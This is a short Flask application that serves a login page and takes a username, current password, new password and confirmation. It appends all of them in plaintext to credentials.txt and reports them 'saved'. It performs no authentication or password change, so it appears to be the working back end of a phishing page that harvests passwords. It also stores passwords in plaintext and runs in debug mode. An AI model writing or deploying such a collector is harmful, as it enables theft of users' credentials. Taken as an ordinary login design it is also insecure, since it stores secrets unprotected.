from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form['username']
    password = request.form['password']
    new_password = request.form['new_password']
    confirm_password = request.form['confirm_password']

    # Save credentials to a file
    with open('credentials.txt', 'a') as file:
        file.write(f"Username: {username}, Password: {password}, New Password: {new_password}, Confirm Password: {confirm_password}\n")

    return "Credentials saved successfully!"

if __name__ == '__main__':
    app.run(debug=True)